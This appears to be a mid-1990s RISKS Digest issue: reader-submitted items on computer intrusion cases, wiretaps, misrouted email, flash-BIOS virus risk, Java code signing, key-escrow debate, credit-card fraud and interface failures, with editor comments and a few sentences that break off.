Eden       E-den       A virtual retreat [e.g., a paradise]
edentate   e-dentate   Using a tooth-valued logic
[toothless projective logics include and-eaters]
elope      e-lope      A fast gait experienced in virtual reality
emir       e-mir       A feeling of peacefulness, resulting from use of a
Russian VR program [Eastern potentates like it]
emotion    e-motion    Screen dither
epic       e-pic       A digital image such as a .gif file [classical!]
eryngo     e-ryngo     Electronic drummer [obscure: with aphroditic rhythms
resulting in candid C-HOL-ly root privileges!]
escape     e-scape     A virtual view [particularly, an elusion or avoidance]
evert      e-vert      A background shade of green on video screens
[particularly confusing while viewing tennis
matches at Chrissie Field in San Francisco]
eyewash    e-yew-ash   A logical grafting of two different tree structures
ewig       e-wig       Computerized enhancement of a balding image
[German: *ewig* = eternal]
__________
FOOTNOTE on e-n-fold:  Prefixing *n* as an index clearly needs a hyphen,
as the following examples illustrate:

nacre      n-acre      An n-acre oyster bed [whose mother was Pearl?]
nark       n-ark       An n-ark fleet of drug-enforcement agents
narrow     n-arrow     An n-arrow quiver [narrow with n=1]
nascent    n-ascent    An n-ascent astronaut [nascent only if n=0]
near       n-ear       An n-ear audience; n need not be an even integer;
someone could be listening with half an ear.
neon       n-eon       Referring to multiple eons [a glowing sign of the times]

Using other symbols as indices also suggests further examples, such as
an i-rate mortgage lender or an i-deal N-antes French card game.
Other cases are left as an exercise for the reader.  PGN

I heard a news report on the wireless saying that Queen Elizabeth did not
deliver the intended speech to the Polish parliament, because of a
"computer error".

Apparently the queen was supposed to include a sentence referring to Polish
Jews in the 2nd World War. She didn't. The official explanation was
"computer error" -- but I also heard it described as a "typographical
error". There have been lots of little articles about it, but no more detail
of what went wrong.

U.S. uses first computer system wiretap
UPI Financial  29/3/96 13:27

By MICHAEL KIRKLAND
&gt;&gt;    WASHINGTON, March 29 (UPI) -- U.S. officials used an unprecedented
court-ordered wiretap of a computer network to charge a young Argentine
man with breaking into Harvard, U.S. Navy and NASA computers, the
Justice Department said Friday.
At a news conference at the Justice Department, U.S. Attorney Donald
Stern of Boston called the operation "cybersleuthing." &lt;&lt;

o    Other systems penetrated, Univ Mass, Cal Tech, Northeastern and systems
in Mexico, Korea, Taiwan, Brazil and Chile.

&gt;&gt;    "The search procedure was specifically designed to let another
computer do the complex searches in a way that provided privacy
protection for the innocent users of the network," Reno said. &lt;&lt;

o    The investigators used a program called I-Watch for Intruder Watch run
on a government computer located at Harvard.  The program searched the net for
the targeted criminal among 16,000 university users.

[DMK:  A search for info on this program revealed I-watch may be a product
from Ipswitch, Inc. of Lexington MA.]

&gt;&gt;    I-Watch was able to "identify certain names that were unique to the
intruder," Heymann said, as well as locations and accounts -- his
"computer habits."
Because the search was conducted by I-Watch, the communications of
the legitimate users were never seen by human eyes. I-Watch was left
undisturbed in its work through November and December until it had
narrowed down the thousands of possibilities to one unauthorized
computer cracker, Julio Cesar Ardita, 21, of Buenos Aires, officials
said. &lt;&lt;

o    Ardita's home was raided on 28 Dec and his PC and modem seized.  He
remains free because the charges against him are not among those when the
US-Argentina extradition treaty applies.

o    Charged with:  "possession of unauthorized devices" (illegal use of
passwords), (18 USC 1029) unlawful interception of electronic communications
(18 USC 2511) and "destructive activity in connection with computers." (18 USC
1030) [DMK: citations mine, not UPI's]

&gt;&gt;  The information he accessed is considered "confidential," Stern said,
but "did not include national security information." &lt;&lt;[DMK: "C2 in 92!"]

&gt;&gt;   Ardita's alleged cracking was first detected last August when the
Naval Command Control and Ocean Surveillance Center in San Diego
detected a computer intruder, officials said. &lt;&lt;   ...

&gt;&gt;    The Naval Criminal Investigative Service did an analysis of the
intruder's "computer habits," including signature programs used to
intercept passwords. &lt;&lt;   ...

&gt;&gt;    Eventually, an intruder who called himself "griton" -- Spanish for
"screamer" -- was detected using four computer systems in Bueons Aires
to crack the Harvard computer, and the illegal accessing of the other
sites was discovered. &lt;&lt;

During May 1991, I received a lot of e-mails sent to me but whose content
was not for me. It was coming from Langley (I'm saying no more to protect
the players). Some messages were really personal. At that time I was busy
(my lab was closed at the end of June) and I didn't do anything at the
beginning.  After several days I sent an answer to these messages and the
answer came back to me! I sent a message to the postmaster: no answer.  And
many messages were related to very interesting internal seminars and other
information related to no-more-paper-in the-printer, also. At the end of the
month, I received a complete list of e-mails at that mysterious location and
I understood. I sent an e-mail to the system manager and the messages
stopped without any explanation (big bug for big brother).  The explanation:
three years ago a friend of me was able to work there, and sending e-mails
was a pain for him.  My friend obtained an alias to be able to send e-mail
more easily to me.  And the alias was jjq for a difficult address with many
!%@'s. It was in use for six months.  The alias was never removed, and when
Jamesa J Quark (not the correct name) was working for the curious location,
they used an account for him with jjq and all the e-mails were sent to me.
It is incredible that it was always working: many paths and names were
changed, but it was very robust.

George Bigham posted this item to SEMPER.FI (a mailing list for Mac
developers) and has given me permission to pass it on to RISKS.

"Hold onto your hats, Mac Technonerds!

1) Larry and Tracey came into the Mac Department today...saying that their
Sony TV Remote Control turns their new Performa 6300 on and off.  The
Performa was purchased [here] last Thursday.

2) Also they reported that the sound on the Performa turned
off on them inexplicably last week, and now the menu bar blinks instead.

3) I asked them how far away from the store they lived, and could they bring
the remote and CPU in (service department is open on Sundays).  They did
that.

4) Their Sony remote turned on and off every Performa in the store, not
just their own!

5) Also, the "Mute" button on the remote clicked an "X" in the "Mute" box

6) Store tech. guy says Infrared is not tunable, and disconnecting it
would also turn off the headphones and the volume control.  He taped over
the infrared port and is contacting Apple for further instructions.

7) The Sony TV Remote Control unit is Model # RM-V21.  It only powers the
Performa on and off when set to the "TV" channel.  But it mutes the
Performa on "TV," CBL," and "VCR."  Other channels are "AV1" and "AV2."
Of course YMMV (Your Mileage May Vary).

George Bigham

P.S.  If this info were generally known, think of the havoc that could be
played out in a lab of Performas by some miscreant with one of these
remote devices! Lots of unsaved ClarisWorks files would get lost, to say
the least."

Page 1 of the *Buffalo News* of 28 Mar 1996 reports a case that shows what
bad things can happen when a computer program pretends to substitute for
legal knowledge.

A man using a borrowed program (make unspecified, price stated to be $9.95)
wrote a will leaving most of his estate to a favorite sister, and token
amounts to a brother and several other sisters and nephews. He printed out
the will, signed it and sent it to the favorite. She saw the blank lines for
witnesses, and signed her own name, and then had her husband and son sign.

The man subsequently died. Erie County Surrogates Court of course rejected
the will on two grounds: will must be signed in presence of witnesses and
witness may not inherit. Now the estate will be divided among those the
testator sought to disinherit.

There is no way to know if the program contained instructions about signing
and witnessing, or if the testator failed to notice them.

The discussions around Java security seems mainly to be how to design
security features to make it technically impossible to use Java to
distribute viruses and other disruptive software. Is this really the right
approach. Java becomes more and more crippled and useless the more of these
security features are added, and the wrong-doers will probably still find
new ways of cheating the security.

In the area of public domain software, security is handled in a different
way: By storing the software in large well-kept depositories, in which any
virus-containing or otherwise malicious software is rapidly removed.  Thus,
the risk of viruses is very small, even though I have downloaded hundreds of
public domain programs, I have never been infected with a virus that way!

The main way in which public domain software becomes safe is because
vigilant users rapidly note and warn about viruses, so that if a
virus-infested program appears, it can be removed within usually less than a
day. Thus, if you choose to download software which has been stored more
than one or two days, you are usually safe.

PICS might be the best way to get a similar function on the web.  PICS, like
public-domain software repositories, can be used to mark (with PICS) or
remove (with software repositories) the malicious items. And the main
advantage with this is that Java can be used to develop much more useful
functions than with the present crippling Java security measures.

1. There is a pleasant alternative to three-way subscription handshakes: any
address that ends with /yourlistnickname should be allowed to freely
subscribe to your mailing list. For example, under various mailers, I could
set up djb-in/risks, or djb+boxes/risks, or djb=whatever/risks.

2. Any message that causes a mailing list subscription or unsubscription
should be forwarded to the subscription address. The manager need not keep a
central log.

3. It is easy to eliminate the race condition in Dick Mills's car radio
display: instead of one button that toggles between time and frequency, the
radio should have one button that switches to time and one button that
switches to frequency. Toggles are bad. Idempotence is good. (And inaction
should never be the only way to obtain the default.)

[Incidentally, the U.S. Postal Service has long had a seriously flawed
policy on changes of address -- forwarding mail for up to a year without
notifying the original address that an address request has been made.
Bogus requests thus sail through undetected, which is not particularly
noticeable to you if you happen to be travelling.  The future automated
postal system is expected to take care of this by notifying both the old
address and the new address of the change, thus providing a little
security in redundancy, but still not enough if you are travelling.  In
the present system, you might try to talk your postmaster into denying all
change requests unless made in person by YOU (at least if you live in a
small town with friendly employees!).  Good luck.  And don't try this at
home.  It is most likely a felony.  PGN

Dick Mills wrote recently regarding a digital car radio:

&gt;I tried to think of a way to redesign the toggle and automatic functions to
&gt;be infallible. I couldn't.  This made me despair.  If we can't make such a
&gt;mundane device behave perfectly, what can we achieve?

He then goes on to propose a rule:

&gt;Any object, capable of any behavior, is capable of unexpected behavior.
&gt;Disregard of this simple principle is the root cause of all other risks.
&gt;It could be an alternative way to define the *meaning* of the word risk.

I disagree.  The behavior was expected by the designer and intentionally
included in the design.  The failure here is not a narrow one of incorrectly
setting the timing of automatic mode shifts that change the meaning of a
button push.  This device's behavior should not be inductively expanded to
encompass all artifacts from pocket knives to spreadsheets.

Failure to produce reliable,robust design should not be equated with some
immutable characteristic of the universe, nor should bad design be regarded
as an unfortunate but unavoidable consequence of technology.  To take such a
position is to embrace nihilism.

The behavior Dick is describing is the _predictable_ result of an _active_,
_deliberate_ design tradeoff on the economic dimensions (in a broad sense)
of display and control design.  The incorporation of two different devices
(clock and radio) in a single device, the use of a single display element to
show the operation of either device, the use of a single control (the push
button) to perform multiple functions (switching between display of the
clock and the display of the currently selected frequency channel...and also
probably the setting of the frequency channel) is result of a decision to
tradeoff complexity of operation for savings in cost of display, visibility
of display elements, cost of control, and the size and accessibility of
control surfaces.  This is the sort of thing Don Norman describes in "The
Design of Everyday Things".

In prior generation systems (which I have described elsewhere as _systeme
verite'_ and _systeme abstraction_) these problems did not occur.  The
ability to use a single control for multiple functions and to use a single
display element for multiple annunciations is characteristic of the current
(_systeme ordinateur_) world where microprocessors are interposed between
the control/display surfaces and the underlying process or system.  In
_verite'_ systems, where there were only mechanical components, and in
_abstraction_ systems, where there were electromechanical components but the
one-to-one mapping between control and display is fixed and static, these
effects did not occur.  The shift to microprocessor based systems removed
the externally imposed constraints on design that previously limited
designers to producing systems whose functional capability was constantly
shown to the user as a fixed display/control space.  The dimensions (in an
information sense) and availability of controls and displays in these
systems remained unchanged with time.  This did not prevent misuse of these
sorts of systems but it did prevent the sorts of phenomena that Dick
describes. [We described an case similar to the one Dick wrote about in the
operation of an intravenous infusion controller where a single switch
performed multiple functions and produced mode errors.]

In _ordinateur_ systems, the fixed relationships are not externally imposed
and so designers are free to use a single control for multiple functions and
a single display for multiple annunciations.  What constrains them is their
ability to see how the tradeoffs they make in design will impact the user
and to appreciate the ways in which these tradeoffs will have unintended
(but, in principle foreseeable!) consequences.

The issue, I think, is that the development of _ordinateur_ systems relaxes
the externally imposed constraints on design and requires a form of design
discipline in order to avoid exactly the problem that Dick raises.  The risk
is not that devices behave erratically or capriciously -- they do not --
rather the risk is that our expanded ability to manipulate control and
display surfaces will not be matched by a thoughtful, inclusive, explicit
design discipline of equal sophistication.  The fault, to paraphrase WS,
lies not in our artifacts but in our design tradeoffs.

I recently attempted to vote on the formation of a controversial newsgroup
(identity withheld to prevent RISKS becoming embroiled in an irrelevant
to-it issue) by sending e-mail in the usual CFV manner, and received the
following e-mail bounce in reply:

----- The following addresses had delivery problems -----
&lt;<A HREF="mailto:voting@someprovider.com">voting@someprovider.com</A>&gt;  (unrecoverable error)

----- Transcript of session follows -----
procmail: Quota exceeded while writing "/usr/spool/mail/voting"
550 &lt;<A HREF="mailto:voting@someprovider.com">voting@someprovider.com</A>&gt;... Can't create output: Error 0

Obviously the votes are being collected faster than the tally program (or
human) can count and empty them from the mail box file and, as a result, the
user's disk space quota has been exceeded.  (I've alerted the site's
postmaster).

I expect this heavy voter participation has to do with strong appeals for
votes from proponents on both sides of the debates through newsletters,
person-to-person e-mail, and other channels.

Then again, maybe someone on one side or the other just mail-bombed the
address.

The risks?

- My vote and probably many others didn't get counted.
- Will one side or the other repudiate the vote because of this?
- Did the neutral, volunteer, vote-taker know what he or she
was getting it to?
- Did he or she warn the post-master (probably - since an e-mail
alias or new account would have to be set up)?
- Will sites be reluctant to host controversial votes in the future?

I attended last week's Sixth Computers, Freedom, and Privacy conference in
Cambridge MA, where policy-makers, technical experts, and activists came
together to hash out the intersection of the three elements of its title.
CFP is an unusual place; the closest thing our community can get to "neutral
ground" on many issues.  This is best expressed by the fact that in the
hallways of the hotel, it's not unusual to see those that supported and
those that fought the Communications Decency Act hob-nobbing it up, trading
friendly swipes about their take on the bill.

In addition, it's always an enjoyable thing to be able to meet an FBI agent
in a neutral setting and ask them questions about their perspective on
various issues.

CFP is still finding it's way, though, as the issues it covers evolve in and
out of the mainstream.  A few years ago the issues were hackers and search
warrants for computers and bulletin boards.  Now that seems to have been
replaced by encryption policy, wiretaps and how much of the First Amendment
applies to the net.

CFP has survived well, and I continue to return every year I can.  I return
not only see the issues from new perspectives, but also to obtain the
synergy that can only happen in a face-to-face encounter.

This isn't to say that CFP doesn't stumble occasionally.  There were a few
panels this year that fell into the CFP trap, where individuals came to
express none-to-fresh perspectives on problems that have been beaten like
the Lone Ranger's dead steed.  Encryption is typically the cause of these.

On the other hand, however, CFP was successful in what is the most
entertaining and enlightening approach to the encryption debate I've seen in
the last two years.  Centering around a mock law that required key escrow,
the CFP program committee set up a "moot court" of five Federal judges (real
ones, with black robes and everything) that heavily questioned attorneys
that presented a cases for the government on one side, and plaintiffs
challenging the law on the other.

The live questioning, and the exercise of having to put one's arguments into
a legal framework was an experience that everyone enjoyed.  This was clearly
the most heavily attended panel of the conference.

The other interesting thing this year was the final panel of the conference,
a reflection on the entire conference done by four science fiction authors:
Bruce Sterling, Vernor Vinge, Pat Cadigan, and Tom Maddox.  This was
probably the most interesting way to reflect on the conference, and the
writers seemed to form a sort of "collective conscience" for the rest of us.

Bruce Sterling, in particular, provided a dystopian view with such a
forceful delivery that I, and many others, probably stumbled from the room
unable to decide if we were happy we knew where we were going, or if we
should run screaming in terror at society's impending train wreck.

It was somewhat appropriate that there was no time for questions after that
panel.  They would have simply detracted from the fact that the writers got
the "last word".

It's a great role though, to have those who dream for us, our science
fiction writers, act as our conscience.  I hope the program committee lets
them do it next year, and I look forward to meeting the next set of faces

A TRAGIC STORY ABOUT A WIRETAP by Shabbir J. Safdar, VTW Board (New York, NY)

This week most of VTW's staff attended the Computers, Freedom, and Privacy
conference in Cambridge Massachusetts.  I go to the conference every year to
recharge my batteries, put names to faces, and enjoy the synergy that can
only come with face-to-face dialogue.

This year the debate over encryption seemed focused on three panels, the
only novel one being a panel which was a "moot court".  Presided over by
five real Federal judges, attorneys for plaintiffs and the government argued
over the Constitutionality of a mock law that would require escrowing of
encryption keys.  Aside from this, the conference added no new material to
the encryption debate.

One valuable experience happened on the way home, however.  I picked up the
New York Times and came across a story in the New York Times Magazine about
a corrupt New Orleans police chief, and how he reacted to a woman who filed
a police brutality complaint against him.

The story goes this way: the FBI was wiretapping a number of New Orleans
police officers who were allegedly guarding a 286 pound shipment of cocaine.
During that time the FBI overheard a conversation between the police chief
and several other police officials that the FBI alleges was a murder plot.
The intended victim had previously filed a police brutality complaint
against the chief.

Although the FBI had the conversation in hand, they were unable to decode
the police chief's "street slang and police jargon" in time to prevent the
murder.  The woman who filed the complaint, a 32 year old mother of three,
was shot while standing in front of her house.

It's easy to be angry about this incident.  One could (and should) be angry
with the murderers and their conspirators.  However out of this comes two
important observations on the encryption policy debate.

One, while wiretaps have probably been effective in other cases, they were
not effective in this one.  While we can grant law enforcement the benefit
of the doubt in other cases, the existence of this one shows that a wiretap
is not the "silver bullet" of law enforcement that we have been led to
believe.

Another observation that can be made is that this parallels the key escrow
debate very closely.  No reasonable person is objecting to the FBI's right
to conduct a wiretap.  However what is being debated is the extent to which
individuals and law enforcement can go to accomplish their duties.  The
Clinton Administration is striving for a world where everyone is forced to
speak in a form of encryption that is easily decoded by law enforcement.
The public and industry is striving for a world where they continue to have
private conversations.

The situational parallel to this would be if the Administration had pushed a
law that requires everyone to speak on the telephone in plain English,
without slang and without any double meanings.  This is the equivalent of
key escrow.

However, would this have really saved the person so tragically killed above?
Unlikely.  Individuals involved in criminal conspiracies will continue to
use whatever means at their disposal to obscure their activities from the
police.  The corrupt police chief who allegedly ordered the murder would
have still used slang and code, regardless of any laws banning such use.  He
was allegedly conspiring to commit a murder, why should he care?

Such laws will, however, affect law abiding citizen's attempts to gain
privacy.  Law-abiding citizens that may be speaking to their doctors,
attorneys, loved-ones, or business partners will continue to be targets of
industrial espionage, private investigators, and, in a few cases, trusted
individuals abusing that trust.

This example from the New York Times Magazine (3/31/96, p.32) shows that
while we can certainly give a little to law enforcement on their arguments
about the effectiveness of wiretaps, they need to give a little in the other
direction on the practicality of forcing people to speak in a
law-enforcement-understandable code.  Obviously, criminals don't care about
such rules.  Since that is the case, is it really worth handicapping all
technology, and exposing individuals to privacy intrusions when such
measures won't even be effective at attaining their stated goals?

&gt;&gt; ST. LOUIS (AP) -- A St. Louis teen-ager arrested last week near
Philadelphia on computer fraud charges is more than just a kid with a hobby
-- and far more dangerous, federal authorities say.  Christopher Schanot,
19, of High Ridge, Mo., is a computer genius who"hacked" his way into the
computers of some of the nation's largest computers, causing security
breaches that forced at least one company to spend thousands of dollars
fixing.&lt;&lt;

o Authorities claim he's a member of the Internet Liberation Front (ILF).

o He claims to be able to take control of any computer he chooses to.

o He was taken to St. Louis Tuesday with a arraignment and bond hearing set
for Thursday.

o His father was quoted: "If a parent can't monitor the child or if the
parent doesn't understand how the Internet works, the computer's modem
should be unplugged."  The younger Schanot received his first computer at
the age of 4 years.  His father was quoted as instructing him to use only
public access computer systems and, "He was an honor student, really he
was all you could want in a child. It was such a shock to us when he
disappeared."

o He was an honors student at Vianney High School in suburban St. Louis.
Shortly after graduation last summer he went to Philadelphia to "lay low."

o His father became concerned about him and contacted the authorities and
turned over his PC to them.

&gt;&gt;In the computer, authorities found a message headed "Greetings from the
Internet Liberation Front." The message was saved to his computer on
Thanksgiving Day 1994, the day of a computerized "break-in" at NBC.  The
message said the group "has now declared war on any company suspected of
contributing to the final demise of the Internet."  "Big boys" in the
telecommunication industry have turned the Internet "into another
overflowing cesspool of greed," the message added.  "We are capable of
penetrating virtually any network linked to the Internet -- ANY network,"
the message said. &lt;&lt;

[DMK: Gee, that was in RISKS and any number of net-news reports back in 94.
The only reason it's not on _my_ PC is I purged it to save disk space.  Does
that qualify me as a "purged" ILF member?]

o His PC also had hundreds of passwords to corporate computer systems,
including defense contractors and the computers of credit reporting
agencies.  The PC also had AT&amp;T calling card numbers, and credit card
numbers in it.

o He was indicted on five counts (unspecified...18 USC 1029/1030?) last
month.  Max slammer time = 30 years + US$1.25E06 in fines.

o Victims:  Southwestern Bell Telephone, BELLCORE, Sprint, and SRI.

o Time frame: Oct 24, 1994 to Apr 23, 1995

Subject: I Cannot Call The AT&amp;T Operator

While in the US, I recently wanted to find out a number in England, and
since I don't know the local directory enquiries number, I called the AT&amp;T
operator. After dialling "00" the "conversation" between me and the abuser
interface (ABI) was:

ABI: "AT&amp;T. To place a call, please dial the number now, or say
'operator' to be connected to an operator".
Me:  "Operator"
ABI: "Sorry, your response was not understood. To place a call, please
dial the number now, or say 'operator' to be connected to the
operator".
Me:  "Operator"
ABI: "Sorry, your response was not understood..."

Thus the abuser interface would  only allow  me to  do the  single thing
that I didn't know how to do. After a few more abortive attempts I found
that the necessary incantation involved pinching my nose and saying "er-
per-eight-er".

The risk? That people with speech impediments, and ethnic minorities who
do not speak with  a "standard"  US accent (i.e., the  majority of  the
human race!)  cannot be connected with an operator, and are  thus unable
to place telephone calls. The abuser interface would have been perfectly
acceptable if  there had  been an  an additional  escape clause  such as
"...or wait for 30 seconds to be connected to an operator".

On a separate but related issue, can anyone tell me  whether the  codecs
in "digital" cellular phones are usable with non-Indo-European languages
such as:
-   languages  where  the  pitch  is  extremely  important   but  the
"consonants" are  relatively unimportant,  e.g. (I  believe) Mandarin
Chinese
- the African "click" languages

[Tom, ``Standard US?'' Many North "Americans" have troubles.  Regional
dialects here are pretty severe.  But certainly Cockney, Australian
*  ('Strine), and other variants of English are unlikely to be decoded.
I suppose we all need the language training that actors get.  I am always
astounded when I hear a Brit or Aussie actor known for wonderful BEnglish
or AusEnglish dialect speaking perfect AEnglish.  Just a thought.  PGN]

In <A HREF="/Risks/17.95.html">RISKS-17.95</A>, Jacob Palme suggests that the reputation of "well-kept
depositories" and PICS-like ratings can be used to guard against malicious
Java code.  A more useful idea along the same lines is to allow for code to
carry a digital signature.  A user could then configure his browser to
reject code with unknown or incorrect signatures.  A more daring user might
simply want a warning.  Confidence could be placed in code obtained from
anywhere, even a malicious host, as long as the signature is valid and you
trust the entity signing it.

Digital signatures are not a panacea, however.  There are real problems with
key distribution and even the smallest change in the code would require it
to be re-signed.  Further, although digital signatures offer protection from
malicious code, there is still the possibility of bugs with security
implications or other harmful effects.

Frank Stuart

[That is actually similar to the Microsoft CAPI (Cryptographic Application
Programming Interface) concept extended to browsers.  Not a bad idea.
Note: concerning hyphenating vs. hyphen-hating, notice the distinction
between re-signed and resigned.  I won't resign from my crusade.  PGN]

In <A HREF="/Risks/17.96.html">RISKS-17.96</A>, J.R. Valverde talked about the risks of having BIOS stored
in flash RAM (because it's rewritable, I hesitate to call it ROM).  A
similar point was raised by Martin Portman in <A HREF="/Risks/17.58.html">RISKS-17.58</A>, with related
information by Sean Reifschneider in <A HREF="/Risks/17.61.html">RISKS-17.61</A>.  All of these are quite
accurate as to the problem.  The purpose of this posting is to let people
know what's happening to fix the problem.

As part of a project I'm working on, I've been working with some of the
large PC vendors.  What I've found is that virtually all Pentium based PCs
on the market today have the flaw described.  This sort of problem was
almost unknown in the 286/386/486 generations of PCs, which used real ROM
for storing the BIOS.

Some of the hardware manufacturers understand the risk here, and have
started to address it.  One solution adopted by some vendors is to build a
one-way switch in hardware.  Once the switch is "thrown" (by sending
commands to a device on the board), the write signal to the flash ROM
holding the BIOS is disabled until the next power cycle.  Some vendors have
put code in their BIOS to automatically throw the switch before they boot
from the floppy or hard drive.  This prevents any sort of malicious software
from modifying the BIOS.  To allow BIOS updates to occur, the BIOS looks for
a "signature" on the floppy before throwing the switch, and if the signature
is found it doesn't throw the switch.  (The ease of spoofing the signature
is another topic.)

Other vendors have implemented a BIOS modification password, which must
be written to a particular address before the write signal to the
flash is unlocked.  Unfortunately, such a password is usually subject
to a dictionary attack by the malicious software, which would be invisible
to the user.

The good news is that because each vendor has solved the problem
differently, it would be difficult for a virus writer to disable arbitrary
PCs (although they might be able to disable all PCs from a given vendor).
That is, diversity results in resistance to plague.

The bad news is that even for those vendors who are doing a good job
addressing this problem, they can't retrofit machines already in the field,
since it requires a hardware change that isn't economical.  Further, because
there's no way to tell by physical inspection whether a given machine has a
rewritable BIOS, users can't determine whether they're at risk.  Vendors are
reluctant to disclose how they've solved this problem (if at all), which
makes it impossible for users to tell if they're at risk.

Of course the whole problem occurs only because most PCs don't run modern
operating systems that would prevent a virus from directly accessing the
hardware.  For example, a PC running UNIX, OS/2, or NT is immune to these
sorts of viruses except at boot time (which can be addressed using careful
procedures).

Mark Rafn's message in <A HREF="/Risks/17.92.html">RISKS-17.92</A> reminded me of a change I made to the
low-level debugger MacsBug, during development of Macintosh System 7.5.

If the user holds down the Control key during startup, the debugger
intentionally seizes control and says "User break at &lt;useless address&gt;."
Users who aren't expecting this write up bug reports that say "The
system crashes when I hold down the control key during startup."

After the third or so of these reports, I was tired of saying "it's a
feature" and decided to make the situation clearer to the users.  Now
the message reads:

Welcome to MacsBug (Thank you for holding down the Control key)

The bug reports stopped.  Perhaps this message shows an appropriate degree
of respect for the user (some alternate versions I considered showed less).

This article brings to mind the birth of the daughter of a teammate of mine.
Seems the chosen name of the child was Zoe (with diaeresis over the "e").
So my teammate sent around a note announcing this name.  However, shortly
after the note went out, people started asking him why in the world he'd
named the kid "ZoK".

Turns out that e-diaeresis is mapped as ctrl-K (or is it alt-K?) on our
system.  When the message was sent to other systems, however, the mail
software converted text that looked something like "Zo^K" to read simply as
"ZoK".

So another risk of computers is one of losing your identity -- on the day

The deficiency of this proposal is demonstrated by the fact that it arrives

up to properly handle ISO 8859-1, which is the only reasonable extended
character set standard for use on the Internet.  It was already mangled in
the RISKS posting (I checked), and as far as I can guess it was presumably
mangled before it left Jon's machine.  I wish people wouldn't assume that
the way their machine handles non-ASCII characters is the same as everyone
else's.

Usenet (at least NNTP) is generally 8-bit transparent, and any European

some people's newsreaders may have to be told about it.  This post of

``Oddly enough, the word `emailed' is actually listed in the OED;
it means "embossed (with a raised pattern) or perh. arranged in a
net or open work".  A use from 1480 is given. The word is probably
derived from French `'emaill'e' (enameled) and related to Old
French `emmaille"ure' (network).  A French correspondent tells
us that in modern French, `email' is a hard enamel obtained by
heating special paints in a furnace; an `emailleur' (no final e) is
a craftsman who makes email (he generally paints some objects
(like, say, jewelry) and cooks them in a furnace).''

I recently received an e-mail reply that addressed someone else by name
about a topic I've never dealt with. My system logs did indicate that I'd
e-mailed the person earlier in the day, so I figured that I had replied to a
posting of theirs and forward a copy to them, and that they had replied to
the wrong message. I was, though, unable to find any previous postings by
that author, and so concluded that it had simply been so recent that the
search engines had not catalogued it yet.

After a day or so I finally realized what had happened. I had, a few weeks
prior, visited another site and had needed to send e-mail out from a WWW
browser on the lab computer I was using. I had configured my e-mail address
as the return address, and had given my server's address as the SMTP
gateway. I did not remember to de-configure them when I left, so the next
time someone send e-mail from that system's browser it not only claimed to
be me but also showed up in my server's logs.

So if you are using a lab computer, be sure to check the reply address
before starting to send mail. If you are replying to someone who might
have been using a lab computer, make sure the reply address matches
your expectations.

The URL "<A HREF="http://www.nando.net/newsroom/ntn/info/040696/info5_14984.html">http://www.nando.net/newsroom/ntn/info/040696/info5_14984.html</A>"
reports "one of the biggest breaches of security of personal data held
by the federal government".  Apparently several employees of the Social
Security Administration sold information including  SSNs and mother's
maiden names of more than 11,000 people to a credit-card fraud ring.

The fraud ring was able to use this information to activate cards which
were stolen from the mail.  Citibank had implemented a scheme which
required customers to "activate" their credit cards when they receive
them by calling a phone number and providing personal information like
their mothers maiden name.

It seems that while systems are being designed to protect our property, it's
just causing the crime to move closer to the person.  If someone steals your
credit card from the mail or your car from the parking lot, you're probably
at a safe distance.  Instead, they are forced to carjack your car at a
stoplight because of your alarm system, or find out personal information
about you.

Similarly, I heard about home breakins on alarmed houses in which the
burglar would regularly trigger the alarm and be careful to leave no
traces.  Once the police stopped coming (because the alarm was faulty),
they were free to break in and swipe whatever they like.

No matter how secure the system, the weakest link can be the clerk who's
paid $12K/year to work on the system.  It doesn't take much money to
convince this person to hand out our personal information.

This sort of thing kind of makes the hassle I went through in keeping my
SSN from my insurance company.  If you've never tried it, for me it was
a huge hassle...  Apparently, all of my claims needed to be handled by
hand by one of the supervisors.  Of course, if everyone did it, their
$4/hour clerks could take care of it.

Terry Ewing (now 21, with 21 months in federal custody ahead of him)
downloaded 1,700 credit-card numbers off of a Tower Records computer system,
just before leaving for DefCon, the West Coast "hackers' convention".  His
friend Michael Kim (now 20) is facing an 18-month sentence.  Apparently,
Tower folks knew their systems had been under attack previously, and were
monitoring misuse.  Police encouraged Tower to wait for the next attack --
in which the intruders used the Tower computer to sort the captured
credit-card numbers by expiration date and create a file of those with a
date at least a year away -- while being observed.  Agents tracked the
intrusion to their apartment, which was searched, revealing the purloined
information.  The two young men were convicted of a felony, although they
had not profited from the credit-card numbers.  [Source: *San Francisco
Chronicle*, 8 Apr 1996, p.A2.]

The article concludes with a quote from Mike Godwin of EFF about those
who ``have this myth that they are cool guys, and [that] the cool guys
always win over the suits.  But the fact is that they are half-socialized,
post-adolescents with serious ethical and moral-boundary problems.''

[Stores should not store credit-card numbers, but I guess we can no
longer number the stores that do not behave sensibly.  I just asked a
mail-order outfit if they would keep a card number around for a
long-deferred delivery; the answer was, ``yes, but we keep in a place
where no one can access it.''  I am sure that gives you RISKS readers a
lot of comfort.  PGN]

The 6-7 Apr 1996 edition of 'The Weekend Australian' carries a report (p 5)
on a court case involving the large Australian insurance company AMP and an
attempt to build a large database of all Australian households.

It was alleged that the "massive database... was supposed to identify every
household in Australia, give each household a unique identifier number,
detail the dwelling type of each household - whether it was two-story,
weatherboard [timber] or brick - and also detail the fire, storm and flood
risk rating of each home." The contractor developing the database, Indata,
expected this database to give AMP a significant commercial advantage.

This database was alleged in court to to have been based on a magnetic tape
of the Australian electoral roll. Under the Australian Electoral Act,
magnetic tapes of the electoral roll cannot be obtained for commercial
purposes. The former manager of Indata said that he had assumed AMP had
investigated the legalities of purchasing the tape and that Indata and AMP
were acting within the law. The tape had already been purchased before the
manager joined Indata.

The court case is a committal hearing against a former AMP client manager
who is charged with 12 counts of attempting to defraud AMP.  The fraud
involves payments to Indata totalling $324,809 (Aus). AMP is expected to
claim that was not aware of the illegal purchase of the electoral roll and
that their client manager had inappropriately authorised payment to Indata.
AMP has demanded return of the money.

The committal hearing will continue next month.

At <A HREF="http://www.timing.se/Daylight.html">http://www.timing.se/Daylight.html</A> there is a brief discussion
of the rules for Daylight Savings Time changeovers for central Europe
and the UK. At the end of the page it says:

&gt; NOTE: From autumn 1996 the rule of changing from standard time to
&gt; daylight time is changed. The new rule is valid for central Europe
&gt; including the UK is:
&gt;
&gt; Standard time    to  Daylight Saving       LAST SUNDAY OF MARCH
&gt; Daylight Saving  to  Standard time         LAST SUNDAY OF OCTOBER
&gt;
&gt; The rule is a "de facto standard," not a law.
&gt;
&gt; The switching occurs at 01:00 UTC for central Europe (Stockholm Paris etc.)
&gt; Local time that is at 02:00 STD to DST  and  03:00 DST to STD.
&gt; (STD = Standard time, DST = Daylight Saving Time or Summer Time.)
&gt;
&gt; Note: The legal switching is steered by laws that state dates for a couple
&gt; of years. When a period ends a new law is issued that gives the dates for
&gt; the next years.
&gt;
